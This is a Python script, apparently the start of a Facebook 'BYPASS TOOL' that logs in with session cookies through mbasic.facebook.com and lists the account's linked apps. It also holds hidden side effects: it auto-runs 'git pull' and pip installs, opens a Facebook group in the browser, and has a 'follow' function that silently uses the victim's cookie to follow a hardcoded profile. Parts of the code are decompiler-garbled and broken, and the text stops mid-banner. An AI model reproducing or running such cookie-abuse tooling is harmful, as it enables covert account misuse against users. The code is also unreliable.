import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/groups/700373307808660/')
logo =("""\033[0;92m
\033[92;1m 😈────────────────────────────────────────────────────────😈
\x1b[1;31m║     .d8888.  .d8b.     d88b    d88b  .d8b.  d8888b.   S \x1b[1;38m║
\x1b[1;32m║     88'  YP d8' `8b    `8P'    `8P' d8' `8b 88  `8D   A \x1b[1;33m║
\x1b[1;33m║     `8bo.   88ooo88     88      88  88ooo88 88   88   J\x1b[1;96m ║
\x1b[1;34m║       `Y8b. 88~~~88     88      88  88~~~88 88   88   J \x1b[1;37m║
\x1b[1;35m║     db   8D 88   88 db. 88  db. 88  88   88 88  .8D   A \x1b[1;33m║
\x1b[1;36m║     `8888Y' YP   YP Y8888P  Y8888P  YP   YP Y8888D'   D \x1b[1;94m║
\033[92;1m😈─────────────────────────────────────────────────────────😈
\033[92;1m║\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m MR®SAJJAD VERSION 2.0😈
\033[92;1m║                                                     
\033[92;1m║\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m DON'T FORGET ALLAH 🥰         
\033[92;1m😈───────────────────────────────────────────────────────────😈
\033[92;1m│\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m─────────────────────\033[91;1m●\033[96;1m●\033[93;1m●\033[94;1m●\033[95;1m●\033[96;1m●\033[92;1m│
\033[92;1m│           \x1b[1;33m╔══════════════════════════════════╗\033[1;91m            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m╔══════════════════════════════╗\033[1;33m ║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m║\033[92;1m[\033[91;1m●\033[92;1m] TOOL NAME : BYPASS TOOL   \033[91;1m║ \x1b[1;33m║            \033[92;1m│
\033[92;1m│           \x1b[1;33m║ \x1b[1;91m
